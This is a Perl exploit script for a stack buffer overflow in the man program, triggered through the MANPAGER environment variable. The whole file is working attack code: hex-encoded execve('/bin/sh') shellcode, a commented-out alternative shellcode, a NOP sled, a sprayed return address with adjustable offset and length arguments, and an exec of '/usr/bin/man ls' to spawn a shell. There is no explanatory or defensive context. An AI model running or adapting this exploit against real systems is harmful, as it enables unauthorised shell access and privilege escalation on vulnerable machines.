#!/usr/bin/perl

$shellcode = "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07" .
             "\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12" .
             "\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8" .
             "\xd7\xff\xff\xff/bin/sh";

# $shellcode = "\xeb\x1f\x5f\x89\xfc\x66\xf7\xd4\x31\xc0\x8a\x07".
#              "\x47\x57\xae\x75\xfd\x88\x67\xff\x48\x75\xf6\x5b".
#              "\x53\x50\x5a\x89\xe1\xb0\x0b\xcd\x80\xe8\xdc\xff".
#              "\xff\xff\x01\x2f\x62\x69\x6e\x2f\x73\x68\x01";

$len = 4094;            # payload size
$nop = "\x90";          # NOP instruction
$retaddr = 0xbffffeed;  # where we want to jump
$offset = -2000;        # leading in the middle of our nop
$n = 25;                # number of retaddr we'll write
$n_ret = $n * 4;        # size of the address range (bytes)

if (@ARGV == 1) {
  $offset = $ARGV[0];
}

if (@ARGV == 2) {
  $offset = $ARGV[0];
  $len = $ARGV[1];
}

if (@ARGV == 3) {
  $offset = $ARGV[0];
  $len = $ARGV[1];
  $n = $ARGV[2];
}

printf("offset: $offset\n");
printf("len: $len\n");
printf("n: $n\n");
printf("address: %#x\n", $retaddr);
printf("new address: %#x\n", ($retaddr + $offset));

$new_retaddr = pack('l', ($retaddr + $offset));

$payload = $nop x ($len - length($shellcode) - $n_ret);
$payload .= $shellcode;
$payload .= $new_retaddr x $n;

$ENV{'MANPAGER'} = $payload;
exec("/usr/bin/man ls");
